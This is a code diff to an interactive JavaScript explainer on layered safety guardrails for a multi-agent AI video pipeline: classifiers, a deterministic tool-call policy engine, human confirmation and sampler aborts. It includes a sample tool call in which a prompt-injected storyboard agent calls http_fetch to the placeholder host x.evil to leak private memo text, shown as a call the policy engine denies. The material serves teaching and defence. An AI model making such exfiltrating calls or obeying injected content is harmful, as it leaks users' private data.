@@ -3,7 +3,7 @@
  * and telemetry, lighting up hop by hop for the fox-astronaut trailer request.
  * Beat format: every step is split into beats (say + card + deep + a gated animation segment). */
 (function () {
-  var SX = [300, 536, 772, 1008, 1244, 1480];
+  var SX = [322, 548, 774, 1000, 1226, 1452];
   var STAGES = [
     ['Client', 'text · 3 img · audio', 'phone', 'cyan'],
     ['Gateway', 'auth · quota · scan', 'shield', 'blue'],
@@ -61,20 +61,20 @@
     S.map = ctx.group();
     S.mapLbl = ctx.text(40, 225, 'PIPELINE', { size: 12, font: 'mono', color: 'dim', spacing: 1.5, parent: S.map });
     S.stages = STAGES.map(function (s, i) {
-      return ctx.node({ x: SX[i], y: 225, w: 196, h: 58, title: s[0], sub: s[1], icon: s[2], color: s[3], titleSize: 14, subSize: 11, parent: S.map });
+      return ctx.node({ x: SX[i], y: 225, w: 190, h: 58, title: s[0], sub: s[1], icon: s[2], color: s[3], titleSize: 14, subSize: 11, parent: S.map });
     });
     S.links = [];
     for (var i = 0; i < 5; i++) S.links.push(ctx.link(S.stages[i], S.stages[i + 1], { color: ctx.alpha('white', 0.35), straight: true, sw: 1.4, parent: S.map }));
     S.cpG = ctx.group({ parent: S.map });
     S.cps = CPN.map(function (n, i) { return n ? mkCP(ctx, i, S.cpG) : null; });
     /* rails */
-    S.auditRail = ctx.path('M205,366 L1578,366', { stroke: ctx.alpha('pink', 0.22), dash: '3 6', sw: 1.2, parent: S.map });
+    S.auditRail = ctx.path('M228,366 L1560,366', { stroke: ctx.alpha('pink', 0.22), dash: '3 6', sw: 1.2, parent: S.map });
     S.auditT = ctx.text(40, 366, 'audit log', { size: 12, font: 'mono', color: 'dim', parent: S.map });
-    S.obsRail = ctx.path('M205,412 L1578,412', { stroke: ctx.alpha('teal', 0.22), dash: '3 6', sw: 1.2, parent: S.map });
-    S.sep = ctx.line(30, 452, 1570, 452, { color: 'line', sw: 1, parent: S.map });
+    S.obsRail = ctx.path('M228,412 L1560,412', { stroke: ctx.alpha('teal', 0.22), dash: '3 6', sw: 1.2, parent: S.map });
+    S.sep = ctx.line(40, 452, 1560, 452, { color: 'line', sw: 1, parent: S.map });
     /* lane headers = zoom targets */
-    S.guard = ctx.node({ x: 108, y: 306, w: 176, h: 50, title: 'Guardrails', sub: 'policy · C2PA', icon: 'shield', color: 'pink', titleSize: 14, subSize: 11, parent: S.map });
-    S.evo = ctx.node({ x: 108, y: 412, w: 176, h: 50, title: 'Evals · Obs', sub: 'quality · traces', icon: 'chart', color: 'teal', titleSize: 14, subSize: 11, parent: S.map });
+    S.guard = ctx.node({ x: 128, y: 306, w: 176, h: 50, title: 'Guardrails', sub: 'policy · C2PA', icon: 'shield', color: 'pink', titleSize: 14, subSize: 11, parent: S.map });
+    S.evo = ctx.node({ x: 128, y: 412, w: 176, h: 50, title: 'Evals · Obs', sub: 'quality · traces', icon: 'chart', color: 'teal', titleSize: 14, subSize: 11, parent: S.map });
     hide([S.mapLbl, S.guard, S.evo, S.auditRail, S.auditT, S.obsRail, S.sep]);
     hide(S.stages); hide(S.links);
     hide(S.cps.filter(Boolean).map(function (c) { return c.g; }));
@@ -109,13 +109,17 @@
     id: 'trust',
     refs: [
       'Reason, <i>Human Error</i> (the “Swiss cheese” model of layered defences), Cambridge University Press 1990',
-      'Inan et al., <i>Llama Guard: LLM-based Input-Output Safeguard for Human-AI Conversations</i>, 2023; Zeng et al., <i>ShieldGemma</i>, 2024',
+      'Inan et al., <i>Llama Guard: LLM-based Input-Output Safeguard for Human-AI Conversations</i>, 2023; Zeng et al., <i>ShieldGemma: Generative AI Content Moderation Based on Gemma</i>, 2024',
       'Greshake et al., <i>Not what you\'ve signed up for: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection</i>, AISec 2023',
       'Cutler et al., <i>Cedar: A New Language for Expressive, Fast, Safe, and Analyzable Authorization</i>, OOPSLA 2024',
-      'C2PA, <i>Content Credentials: C2PA Technical Specification</i> v2.1, 2024; Gowal et al., <i>SynthID-Image: Image watermarking at internet scale</i>, 2025',
-      'Huang et al., <i>VBench: Comprehensive Benchmark Suite for Video Generative Models</i>, CVPR 2024; Zheng et al., <i>VBench-2.0</i>, 2025',
-      'Sigelman et al., <i>Dapper, a Large-Scale Distributed Systems Tracing Infrastructure</i>, Google TR 2010; OpenTelemetry specification &amp; GenAI semantic conventions, 2024–2025',
-      'Beyer et al., <i>Site Reliability Engineering</i> (SLOs, error budgets), O\'Reilly 2016; Kohavi, Tang &amp; Xu, <i>Trustworthy Online Controlled Experiments</i>, CUP 2020'
+      'C2PA, <i>Content Credentials: C2PA Technical Specification</i> v2.1, 2024',
+      'Gowal et al., <i>SynthID-Image: Image watermarking at internet scale</i>, 2025',
+      'Huang et al., <i>VBench: Comprehensive Benchmark Suite for Video Generative Models</i>, CVPR 2024; Zheng et al., <i>VBench-2.0: Advancing Video Generation Benchmark Suite for Intrinsic Faithfulness</i>, 2025',
+      'OpenTelemetry, <i>Semantic Conventions for Generative AI</i> (gen_ai.* spans and metrics), 2024–2026',
+      'W3C, <i>Trace Context</i> Recommendation, 2021',
+      'Sigelman et al., <i>Dapper, a Large-Scale Distributed Systems Tracing Infrastructure</i>, Google TR 2010',
+      'Beyer et al. (eds.), <i>Site Reliability Engineering: How Google Runs Production Systems</i>, O\'Reilly 2016',
+      'Kohavi, Tang &amp; Xu, <i>Trustworthy Online Controlled Experiments</i>, CUP 2020'
     ],
     steps: [
       /* ------------------------------------------------------------ 1 */
@@ -147,7 +151,7 @@
               '<p>The audit log answers <i>what did the system decide, under which policy version?</i> The trace answers <i>how long did it take and what did it cost?</i> The evaluation plane consumes both to compute false-positive rates, overhead and drift.</p>'
           },
           {
-            say: 'No single layer is perfect. Each has holes, and a threat gets through only when the holes line up, the Swiss cheese model. So the design goal is layers whose failures are uncorrelated.',
+            say: 'No single layer is perfect. Each one has holes, and a threat gets through only when the holes in successive layers line up. That is the Swiss cheese model, and it makes the design goal layers whose failures are uncorrelated.',
             card: { tag: 'KEY IDEA', title: 'Holes must not line up', body: 'Layers built on the same model or data share blind spots. Diversify the signals: hashes, classifiers, policy code, judges, cryptography, humans.' },
             deep: '<p>The threat model for the trailer job has six families, listed on the left:</p>' +
               '<ul><li><b>harmful content</b> in prompts or outputs;</li><li><b>likeness and IP</b> misuse: real faces, cloned voices;</li><li><b>indirect prompt injection</b> hidden in an uploaded sketch;</li><li><b>exfiltration</b> of the private voice memo;</li><li><b>abuse and cost</b> attacks such as GPU farming;</li><li><b>silent regression</b> after a model upgrade.</li></ul>' +
@@ -276,14 +280,14 @@
           {
             say: 'The first checkpoint fires the moment the uploads land. The prompt goes to a small text classifier, the three sketches to an image classifier plus a perceptual hash lookup against known bad content, and the voice memo is transcribed and then classified.',
             card: { tag: 'HOW IT WORKS', title: 'Three modalities in parallel', body: 'Text, image and audio branches run concurrently, so the slowest branch, speech recognition on the memo, sets the latency.' },
-            deep: '<p><b>Text</b>: a small encoder classifier (~100M parameters, ~5 ms) or an LLM safeguard such as Llama Guard or ShieldGemma for nuanced policy (50–200 ms).</p>' +
-              '<p><b>Images</b>: a ViT or SigLIP-backbone multi-head classifier (10–20 ms per image on a GPU) plus <b>perceptual hashes</b> (PDQ, PhotoDNA) matched against industry hash lists: near-exact recall on <i>known</i> abuse material, no generalisation to new material.</p>' +
+            deep: '<p><b>Text</b>: a small encoder classifier (on the order of 100M parameters, a few ms) or an LLM safeguard such as Llama Guard (a fine-tuned Llama 2 7B) or ShieldGemma for nuanced policy (roughly 50–200 ms). These latencies are planning figures, not measurements.</p>' +
+              '<p><b>Images</b>: a ViT or SigLIP-backbone multi-head classifier (10–20 ms per image on a GPU) plus <b>perceptual hashes</b> matched against industry hash lists. Meta\'s PDQ is a 256-bit hash compared by Hamming distance, with at most 31 differing bits as its suggested starting threshold; PhotoDNA is Microsoft\'s counterpart. Recall is high on <i>known</i> abuse material and there is no generalisation to new material.</p>' +
               '<p><b>Audio</b>: ASR with a Whisper-class model, then a text classifier and an audio-event model. OCR text lifted from the sketches is kept for prompt-injection screening later in the job.</p>'
           },
           {
             say: 'Each branch produces a calibrated score for every policy category: sexual content, minors, violence, hate, self harm, weapons and real people. Each category has its own threshold, and minors is set far lower than violence.',
             card: { tag: 'NUMBERS', title: 'One threshold does not fit all', stat: { v: '0.2 vs 0.7', l: 'block threshold for minors versus violence: a miss costs far more than a false block' },
-              more: '<p>With calibrated scores, blocking minimises expected cost when s &gt; C<sub>FP</sub> / (C<sub>FP</sub> + C<sub>FN</sub>). A miss treated as 4× worse than a false block gives τ = 0.2; a false block on legitimate cinematic action treated as 2.3× worse than a miss gives τ = 0.7.</p>' },
+              more: '<p>With calibrated scores, blocking minimises expected cost when s &gt; C<sub>FP</sub> / (C<sub>FP</sub> + C<sub>FN</sub>). A miss treated as 4× worse than a false block gives τ = 0.2; a false block on legitimate cinematic action treated as 2.3× worse than a miss gives τ = 0.7.</p><p>For the gravest categories the cost ratio is often 100× or more, which pushes τ below 0.01. Those categories run at very high recall and hand many borderline items to human review.</p>' },
             deep: '<p>Ingress is a <b>multi-label, multi-modal</b> classification: for each category c and modality m a calibrated score s<sub>c,m</sub> ∈ [0, 1], and a per-category decision:</p>' +
               '<div class="eq">block ⇔ ∃c : max<sub>m</sub> s<sub>c,m</sub> &gt; τ<sub>c</sub></div>' +
               '<p>Thresholds are <b>asymmetric</b>. For minors a miss is catastrophic, so τ is set for very high recall and accepts more false blocks. For violence τ is looser, because cinematic action is legitimate and over-blocking art is a product failure too. Calibration (temperature scaling on held-out labels) keeps τ meaningful across model versions.</p>'
@@ -298,7 +302,7 @@
             say: 'The job is admitted in about one hundred forty milliseconds. One span of text found by OCR is quarantined for injection screening later, and the memo is routed to the likeness check before any voice cloning.',
             card: { tag: 'NUMBERS', title: 'Admitted in a blink', stat: { v: '142', u: 'ms', l: 'to score all three modalities in parallel and admit the job' } },
             deep: '<p>The decision is logged as JSON with model versions, thresholds and hash results, so policy changes can be <b>replayed</b>: would today\'s policy have admitted last month\'s job?</p>' +
-              '<p>Latency budget: distilled Whisper-class ASR on the 42 s memo dominates (~110 ms batched on a GPU, hundreds of times faster than real time); classifiers add 10–20 ms; fan-in, policy and logging ~15 ms. High-severity categories <i>fail closed</i> when a model is unavailable; low-severity ones fail open with a flag for asynchronous review.</p>'
+              '<p>Latency budget (assumed figures): distilled Whisper-class ASR on the 42 s memo dominates, at about 110 ms batched on a GPU, roughly 380 times faster than real time (the Distil-Whisper paper reports 5.8 times the speed of Whisper large-v2); classifiers add 10–20 ms; fan-in, policy and logging about 15 ms. High-severity categories <i>fail closed</i> when a model is unavailable; low-severity ones fail open with a flag for asynchronous review.</p>'
           }
         ],
         run: function (ctx) {
@@ -396,14 +400,14 @@
             card: { tag: 'KEY IDEA', title: 'Guard the action, not the words', body: 'A model that never says anything harmful can still call a harmful tool. The policy engine sees the call, not the chat.' },
             deep: '<p>An LLM\'s output is <b>untrusted input</b> to the system that executes it. So tool calls pass through a policy decision point written as code (Cedar, OPA/Rego or a typed rule engine) and evaluated per call:</p>' +
               '<div class="eq">allow(call) = call.tool ∈ A[agent] ∧ ∀k: φ<sub>k</sub>(call.args, job) ∧ cost(call) ≤ budget</div>' +
-              '<p>The runtime, not the model, executes the call, so the engine sits on the only path to the side effect. Cedar is default-deny, lets <i>forbid</i> override <i>permit</i>, evaluates in microseconds and is amenable to automated analysis of what a policy set can allow.</p>'
+              '<p>The runtime, not the model, executes the call, so the engine sits on the only path to the side effect. Cedar is default-deny and lets <i>forbid</i> override <i>permit</i>. Its authors measure authorization 28.7 to 35.2 times faster than OpenFGA and 42.8 to 80.8 times faster than Rego, and its SMT encoding is sound, decidable and complete, so tools can check what a policy set can allow.</p>'
           },
           {
             say: 'It asks four questions. Is this tool on the calling agent\'s allowlist? Are the arguments within bounds? Are the reference images assets the user actually owns? Is there budget left? The camera agent\'s render call passes all four.',
-            card: { tag: 'HOW IT WORKS', title: 'Four questions, all deterministic', body: 'Allowlist, argument bounds, data provenance and budget: plain code, microseconds, no language model in the loop.' },
+            card: { tag: 'HOW IT WORKS', title: 'Four questions, all deterministic', body: 'Allowlist, argument bounds, data provenance and budget: plain code, typically microseconds to milliseconds, no language model in the loop.' },
             deep: '<ul><li><b>Argument policy</b>: bounds (<code>duration_s ≤ 10</code>), type and range checks.</li>' +
               '<li><b>Data provenance</b>: <code>refs ⊆ job.assets</code>. The model cannot smuggle a URL it read inside an image into a fetch, because only assets registered to this job pass.</li>' +
-              '<li><b>Budgets</b>: GPU-seconds and token caps per job, enforced at the call site, bound a runaway loop. Here the estimate is 760 GPU-seconds against a budget of 1,840.</li></ul>' +
+              '<li><b>Budgets</b>: GPU-seconds and token caps per job, enforced at the call site, bound a runaway loop. Here the estimate is 760 GPU-seconds against 4,440 remaining of the 5,960 GPU-second hold made at the gateway, after the reservations for shots 1 and 2.</li></ul>' +
               '<p>Because evaluation is deterministic it is <i>testable</i>: policies ship with unit tests and are versioned alongside the agents.</p>'
           },
           {
@@ -420,9 +424,9 @@
               '<p>Denials are also <b>signals</b>. A deny on a tool an agent has never been granted suggests its context was poisoned; the trace links the deny to the span that ingested the untrusted sketch. Deny rate per agent and tool is a metric, and a sudden rise means probing or a bad prompt release.</p>'
           },
           {
-            say: 'The third call is publish from the editor. Publishing has external, irreversible effects, so the engine holds it until a human confirms.',
-            card: { tag: 'KEY IDEA', title: 'Irreversible means a human decides', body: 'Confirmation shows which inputs influenced the request, and is reserved for publish, pay and email so people are not trained to click through.' },
-            deep: '<p><b>Confirmation fatigue</b> is a real failure mode: a person who approves two hundred prompts a day rubber-stamps them. Keep the confirm set small, tier effects, and show provenance (<i>this publish was influenced by: prompt, sketches, memo</i>).</p>' +
+            say: 'The third call is publish from the editor. Publishing has external, irreversible effects, so the engine holds it until a human confirms. Every other cell of the matrix is live too, so click any pair and see what the engine decides.',
+            card: { tag: 'TRY IT', title: 'Probe any cell', body: 'Click a cell to ask the policy engine whether that agent may call that tool. <b>Publish</b> always lands on confirm, and empty cells deny.' },
+            deep: '<p>Irreversible effects (publish, pay, email) always wait for a person. <b>Confirmation fatigue</b> is the failure mode: someone who approves two hundred prompts a day rubber-stamps them. Keep the confirm set small, tier effects, and show provenance (<i>this publish was influenced by: prompt, sketches, memo</i>).</p>' +
               '<p>Bind each approval to a <b>hash of the exact arguments</b> and make it single-use with an expiry, so the call cannot be swapped between check and use (a time-of-check to time-of-use attack).</p>'
           }
         ],
@@ -434,21 +438,35 @@
             '{"tool": "render_shot",',
             ' "caller": "agent:camera",',
             ' "args": {"shot": 3,',
-            '   "duration_s": 6,',
+            '   "duration_s": 5,',
             '   "refs": ["asset://sketch_2"],',
             '   "est_gpu_s": 760}}'
           ] });
           S.pe = ctx.node({ x: 790, y: 540, w: 300, h: 58, title: 'Policy engine', sub: 'Cedar / OPA · deterministic', icon: 'lock', color: 'pink', titleSize: 15, subSize: 11, parent: g });
           var l1 = ctx.link({ x: 490, y: 560 }, S.pe, { color: 'pink', to: 'l', parent: g });
           /* beat 1 material: the four rules */
-          var RULES = ['tool ∈ allow[agent:camera]', 'duration_s ≤ 10', 'refs ⊆ job.assets (cleared)', 'est_gpu_s ≤ budget (1,840 s)'];
+          var RULES = ['tool ∈ allow[agent:camera]', 'duration_s ≤ 10', 'refs ⊆ job.assets (cleared)', 'est_gpu_s ≤ remaining (4,440 s)'];
           var rules = RULES.map(function (s, i) {
             var rg = ctx.group({ parent: g, opacity: 0 });
             var y = 612 + i * 34;
             rg.ic = ctx.icon('check', 662, y, 16, 'faint', { parent: rg });
-            ctx.text(680, y, s, { size: 13, font: 'mono', color: 'text', parent: rg });
+            rg.tx = ctx.text(680, y, s, { size: 13, font: 'mono', color: 'text', parent: rg });
+            rg.mk = ctx.text(662, y, '', { size: 15, font: 'mono', weight: 700, color: 'red', anchor: 'middle', parent: rg });
             return rg;
           });
+          /* the four questions are re-asked for each call: ok, fail, skip (short-circuited) or hold (needs a human) */
+          function setRules(list) {
+            list.forEach(function (r, i) {
+              var rg = rules[i], st = r[1];
+              rg.tx.textContent = r[0];
+              rg.setAttribute('opacity', st === 'skip' ? 0.3 : 1);
+              rg.ic.setAttribute('opacity', st === 'ok' ? 1 : 0);
+              rg.ic.firstChild.setAttribute('stroke', C.lime);
+              rg.mk.textContent = st === 'fail' ? '✗' : (st === 'hold' ? '!' : '');
+              rg.mk.setAttribute('fill', st === 'fail' ? C.red : C.amber);
+              rg.tx.setAttribute('fill', st === 'fail' ? C.red : (st === 'hold' ? C.amber : C.text));
+            });
+          }
           /* beat 2 material: the permission matrix */
           var AG = ['director', 'writer', 'storyboard', 'camera', 'editor', 'critic'];
           var TL = ['search_refs', 'render_shot', 'tts', 'edit_tl', 'publish', 'http_fetch'];
@@ -483,10 +501,45 @@
             var hl = ctx.rect(p.x - 17, p.y - 17, 34, 34, { rx: 6, stroke: c[2], sw: 2.4, glow: true, parent: mg });
             return ctx.reveal(hl, { from: 'scale', dur: 300 });
           }
+          /* the second and third calls replace the first one in the call panel */
+          var g2 = ctx.group({ parent: g, opacity: 0 });
+          var js2 = ctx.code({ x: 40, y: 500, w: 450, title: 'tool_use · agent:storyboard', lang: 'json', size: 13, typing: true, parent: g2, color: 'red', lines: [
+            '{"tool": "http_fetch",',
+            ' "caller": "agent:storyboard",',
+            ' "args": {"url":',
+            '   "https://x.evil/?d=I%20crashed…"}}'
+          ] });
+          var g3 = ctx.group({ parent: g, opacity: 0 });
+          var js3 = ctx.code({ x: 40, y: 500, w: 450, title: 'tool_use · agent:editor', lang: 'json', size: 13, typing: true, parent: g3, color: 'amber', lines: [
+            '{"tool": "publish",',
+            ' "caller": "agent:editor",',
+            ' "args": {"asset": "trailer.mp4",',
+            '   "visibility": "public"}}'
+          ] });
+          /* beat 4 material: a live probe of any agent x tool cell */
+          var probe = ctx.group({ parent: g, opacity: 0 });
+          var probeT = ctx.text(1560, 866, 'click any cell to probe the engine', { size: 12, font: 'mono', color: 'dim', anchor: 'end', parent: probe });
+          var probeR = ctx.rect(mx, my, 34, 34, { rx: 6, stroke: 'white', sw: 2, parent: probe, opacity: 0 });
+          function arm() {
+            var V = { A: ['ALLOW', 'lime', 'allowlisted · args checked'], C: ['CONFIRM', 'amber', 'external effect → human'], '.': ['DENY', 'red', 'not granted → default deny'] };
+            AG.forEach(function (a, r) {
+              TL.forEach(function (t, c) {
+                var cell = M.cells[r][c];
+                cell.style.cursor = 'pointer';
+                cell.addEventListener('click', function () {
+                  var v = V[P[r].charAt(c)], q = M.cellCenter(r, c);
+                  probeR.setAttribute('x', q.x - 17); probeR.setAttribute('y', q.y - 17);
+                  probeR.setAttribute('stroke', C[v[1]]); probeR.setAttribute('opacity', 1);
+                  probeT.textContent = a + '.' + t + ' → ' + v[0] + ' · ' + v[2];
+                  probeT.setAttribute('fill', C[v[1]]);
+                });
+              });
+            });
+          }
           ctx.reveal(js, { from: 'left' });
           ctx.reveal(S.pe, { from: 'scale', delay: 200 });
           ctx.reveal(l1, { from: 'draw', delay: 300 });
-          ctx.hud('policy check per tool call · µs · deterministic');
+          ctx.hud('policy check per call · µs–ms · deterministic');
           /* beat 0: a tool call is intercepted */
           return js.typeAll().then(function () {
             return ctx.packet(l1, { color: 'pink', dur: 600, label: 'intercept' });
@@ -515,12 +568,22 @@
             return ctx.beat(3);
           }).then(function () {
             /* beat 3: a denied call */
-            return cellMark(1).then(function () { return callRow(1); });
+            ctx.fade(js, 0, 300);
+            ctx.reveal(g2, { from: 'up', dur: 300 });
+            setRules([['tool ∈ allow[agent:storyboard]', 'fail'], ['url ∈ egress allowlist', 'skip'], ['taint(args) ∌ private', 'skip'], ['est_gpu_s ≤ remaining', 'skip']]);
+            return js2.typeAll().then(function () { return cellMark(1); }).then(function () { return callRow(1); });
           }).then(function () {
             return ctx.beat(4);
           }).then(function () {
-            /* beat 4: a call that needs a human */
-            return cellMark(2).then(function () { return callRow(2); });
+            /* beat 4: a call that needs a human, then the live probe */
+            ctx.hud('click any cell · the engine answers');
+            ctx.fade(g2, 0, 300);
+            ctx.reveal(g3, { from: 'up', dur: 300 });
+            setRules([['tool ∈ allow[agent:editor]', 'ok'], ['asset ∈ job.assets (cleared)', 'ok'], ['effect tier = external → confirm', 'hold'], ['est_gpu_s ≤ remaining', 'ok']]);
+            arm();
+            return js3.typeAll().then(function () { return cellMark(2); }).then(function () { return callRow(2); }).then(function () {
+              return ctx.reveal(probe, { from: 'up', dur: 400 });
+            });
           });
         }
       },
@@ -530,38 +593,39 @@
         beats: [
           {
             say: 'The third checkpoint lives inside the generator. Before sampling, the shot prompt is screened and rewritten with negative concepts, and only ingress-cleared reference images may condition the model. The weights themselves were safety tuned.',
-            card: { tag: 'HOW IT WORKS', title: 'Three depths of control', body: 'Weights are hardest to bypass, conditioning is cheapest to change, and guidance steers each sample away from unwanted concepts.' },
-            deep: '<ul><li><b>Weights</b>: safety fine-tuning and <b>concept erasure</b> (ESD, UCE) remove capabilities before deployment. Hardest to bypass, hardest to update.</li>' +
+            card: { tag: 'HOW IT WORKS', title: 'Three depths of control', body: 'Weights are the deepest layer and the slowest to change, conditioning is the cheapest to change, and guidance steers each sample away from unwanted concepts.' },
+            deep: '<ul><li><b>Weights</b>: safety fine-tuning and <b>concept erasure</b> (ESD, UCE) remove capabilities before deployment. The deepest layer and the hardest to update, but not a guarantee: erased concepts can sometimes be recovered with adversarial prompts.</li>' +
               '<li><b>Conditioning</b>: prompt screening and rewriting, and a <b>reference gate</b>: only ingress-cleared, consented images and voices may condition the model.</li>' +
               '<li><b>Guidance</b>: a negative prompt replaces the null branch of classifier-free guidance, pushing samples away from the concept:</li></ul>' +
               '<div class="eq">ṽ = v(x<sub>t</sub>, c<sub>neg</sub>) + w · ( v(x<sub>t</sub>, c) − v(x<sub>t</sub>, c<sub>neg</sub>) )</div>' +
               '<p>No extra compute: the negative branch takes the place of the unconditional one.</p>'
           },
           {
-            say: 'Then, during sampling, every four steps we peek at the model\'s current estimate of the clean video. With rectified flow that estimate is nearly free: take the current sample and subtract the predicted velocity times the time remaining.',
-            card: { tag: 'NUMBERS', title: 'A free look at the answer', stat: { v: '10', u: 'previews', l: 'one every 4 of 40 denoising steps, about 1 percent of sampling time' } },
+            say: 'Then, during sampling, every five steps we peek at the model\'s current estimate of the clean video. With rectified flow that estimate is nearly free: take the current sample and subtract the predicted velocity times the time remaining.',
+            card: { tag: 'NUMBERS', title: 'A free look at the answer', stat: { v: '10', u: 'previews', l: 'one every 5 of 50 denoising steps, about 1 percent of sampling time' } },
             deep: '<p>With rectified flow, x<sub>t</sub> = (1−t)·x<sub>0</sub> + t·ε and the network predicts the velocity v = ε − x<sub>0</sub>. Rearranging gives a clean-sample estimate at every step, with no extra network call:</p>' +
               '<div class="eq">x̂<sub>0</sub> = x<sub>t</sub> − t · v̂<sub>θ</sub>(x<sub>t</sub>, t, c)</div>' +
-              '<p>Latent shape for an 81-frame 720p shot: x<sub>t</sub> ∈ ℝ<sup>16×21×90×160</sup> (VAE stride 4×8×8). A tiny decoder (TAESD-style, a few ms per frame) turns a few frames of x̂<sub>0</sub> into pixels, or a classifier reads the latent directly.</p>'
+              '<p>Latent shape for one 5 s, 121-frame, 720p shot: x<sub>t</sub> ∈ ℝ<sup>16×31×90×160</sup> (VAE stride 4×8×8), which is 111,600 tokens after 1×2×2 patches. A tiny decoder (TAESD-style, a few ms per frame) turns a few frames of x̂<sub>0</sub> into pixels, or a classifier reads the latent directly.</p>' +
+              '<details><summary>Go deeper</summary><p>Derivation: from v = ε − x<sub>0</sub> we get ε = v + x<sub>0</sub>. Substituting into x<sub>t</sub> = (1−t)·x<sub>0</sub> + t·ε gives x<sub>t</sub> = x<sub>0</sub> + t·v, so x<sub>0</sub> = x<sub>t</sub> − t·v. With a noise-prediction network the same estimate is x̂<sub>0</sub> = (x<sub>t</sub> − √(1−ᾱ<sub>t</sub>)·ε̂) / √ᾱ<sub>t</sub>. Both equal the posterior mean E[x<sub>0</sub> | x<sub>t</sub>] up to model error.</p></details>'
           },
           {
-            say: 'A safe shot like ours converges quietly. The preview sharpens from noise into the crash site while the unsafe probability stays far below the threshold at every check.',
-            card: { tag: 'WHY IT MATTERS', title: 'Safe shots pay almost nothing', body: 'Ten cheap previews cost about one percent of sampling time. The check only really costs money when it saves a shot.' },
-            deep: '<p>Overhead on an accepted shot: 10 previews × (decode 3 frames ≈ 10 ms + classifier ≈ 20 ms) ≈ 0.3 s against ~95 s of sampling, well under 1%.</p>' +
+            say: 'A safe shot like ours converges quietly. The preview sharpens from noise into the crash site while the unsafe probability stays far below the threshold at every check. Click the timeline to scrub through it yourself.',
+            card: { tag: 'TRY IT', title: 'Scrub the sampler', body: 'Click the timeline to jump to any denoising step and watch the estimate sharpen. Click the preview to swap in an unsafe sample and see it cross the threshold.' },
+            deep: '<p>Overhead on an accepted shot: 10 previews × about 0.1 s each (decode a few frames with the tiny decoder ≈ 40 ms, classify ≈ 30 ms, gather the latent from the 8 sequence-parallel ranks ≈ 30 ms) ≈ 1 s against ~95 s of sampling, so about 1%. Safe shots pay almost nothing.</p>' +
               '<p>Early x̂<sub>0</sub> is not a picture of the final video. It is the <b>conditional mean</b> E[x<sub>0</sub> | x<sub>t</sub>]: a blur that averages every plausible video consistent with the noisy sample. Classifiers must be trained on x̂<sub>0</sub> <i>at each step index</i>, with labels taken from the final decoded video.</p>'
           },
           {
-            say: 'An unsafe sample looks different. Its probability climbs across the first checks, crosses the threshold at step twelve of forty, and the sample is aborted on the spot.',
+            say: 'An unsafe sample looks different. Its probability climbs across the first checks, crosses the threshold at step fifteen of fifty, and the sample is aborted on the spot.',
             card: { tag: 'PITFALL', title: 'Blurry previews can mislead', body: 'Early estimates are averages, so one fixed threshold either misses real problems or aborts good shots. Calibrate the threshold per step index.' },
-            deep: '<p>By Tweedie\'s formula the denoiser output is the posterior mean, so early previews are low-frequency averages. A hazard that is only a high-frequency detail (a logo, a face) may not be visible at step 12; content-defined by layout and colour usually is.</p>' +
+            deep: '<p>By Tweedie\'s formula the denoiser output is the posterior mean, so early previews are low-frequency averages. A hazard that is only a high-frequency detail (a logo, a face) may not be visible at step 15; content-defined by layout and colour usually is.</p>' +
               '<details><summary>Go deeper</summary><p>Choose a per-step threshold τ<sub>k</sub> such that precision on eventually-unsafe outputs reaches a target (for example 95%) at step k. Early steps then abort only when confident; late steps are permissive. An abort emits a <code>gen.abort</code> event with the preview hash as evidence, and the job either refuses or resamples with a new seed.</p></details>'
           },
           {
-            say: 'Aborting at step twelve costs two hundred twenty eight GPU seconds instead of seven hundred sixty, saving seventy percent of that shot. The ten previews on accepted shots add about one percent, so the check pays for itself in GPU time only if more than roughly one in seventy samples is rejected.',
-            card: { tag: 'NUMBERS', title: 'What an early abort saves', stat: { v: '70%', l: 'of a shot\'s GPU time when aborted at step 12 of 40: 228 of 760 GPU-seconds' },
+            say: 'Aborting at step fifteen costs two hundred twenty eight GPU seconds instead of seven hundred sixty, saving seventy percent of that shot. The ten previews on accepted shots add about one percent, so the check pays for itself in GPU time only if more than roughly one in seventy samples is rejected.',
+            card: { tag: 'NUMBERS', title: 'What an early abort saves', stat: { v: '70%', l: 'of a shot\'s GPU time when aborted at step 15 of 50: 228 of 760 GPU-seconds' },
               more: '<p>Break-even: the check costs about 1% on every sample and saves 70% on each rejected one, so it is GPU-neutral when ρ<sub>reject</sub> × 0.70 = 0.01, that is ρ<sub>reject</sub> ≈ 1.4%. Below that rate it is a safety feature bought for about 1% of GPU cost.</p>' },
             deep: '<div class="eq">saved GPU = ρ<sub>reject</sub> · (1 − k/N)</div>' +
-              '<p>A rejected shot at k = 12 of N = 40 costs 228 of 760 GPU-seconds (8 × H100 × 95 s). Overhead on accepted shots is about 1%, so the net effect is <b>negative</b> unless rejects are common. For a consumer product with mostly benign traffic, the real payoff is bounded exposure: unsafe pixels are never fully rendered, stored or delivered.</p>'
+              '<p>A rejected shot at k = 15 of N = 50 costs 228 of 760 GPU-seconds (8 × H100 × 95 s). Overhead on accepted shots is about 1%, so on GPU cost alone the check is a net <b>loss</b> unless more than about 1.4% of samples are rejected. For a consumer product with mostly benign traffic, the real payoff is bounded exposure: unsafe pixels are never fully rendered, stored or delivered.</p>'
           }
         ],
         run: function (ctx) {
@@ -573,7 +637,7 @@
             '         skids across glowing ice"',
             '+ neg:  "gore, real-person face, logo"',
             '+ refs: sketch_2 (ingress-cleared)',
-            '+ cfg 5.0 · steps 40 · seed 7715'
+            '+ cfg 5.0 · steps 50 · seed 1234'
           ] });
           var cards = [['Safety-tuned weights', 'refusal SFT · concept erasure'], ['Reference gate', 'consented, cleared refs only'], ['Guidance', 'negative prompt under CFG']].map(function (c, i) {
             return ctx.node({ x: 270, y: 690 + i * 62, w: 460, h: 50, title: c[0], sub: c[1], icon: ['layers', 'lock', 'gear'][i], color: 'pink', titleSize: 14, subSize: 11, parent: g });
@@ -582,9 +646,9 @@
           var g1 = ctx.group({ parent: g, opacity: 0 });
           var tx0 = 580, tx1 = 1100, ty = 520;
           ctx.line(tx0, ty, tx1, ty, { color: 'faint', sw: 2, parent: g1 });
-          for (var k = 0; k <= 40; k++) {
-            var xx = tx0 + (tx1 - tx0) * k / 40;
-            ctx.line(xx, ty - (k % 4 === 0 ? 7 : 3), xx, ty + (k % 4 === 0 ? 7 : 3), { color: k % 4 === 0 ? 'pink' : 'faint', sw: 1, parent: g1 });
+          for (var k = 0; k <= 50; k++) {
+            var xx = tx0 + (tx1 - tx0) * k / 50;
+            ctx.line(xx, ty - (k % 5 === 0 ? 7 : 3), xx, ty + (k % 5 === 0 ? 7 : 3), { color: k % 5 === 0 ? 'pink' : 'faint', sw: 1, parent: g1 });
           }
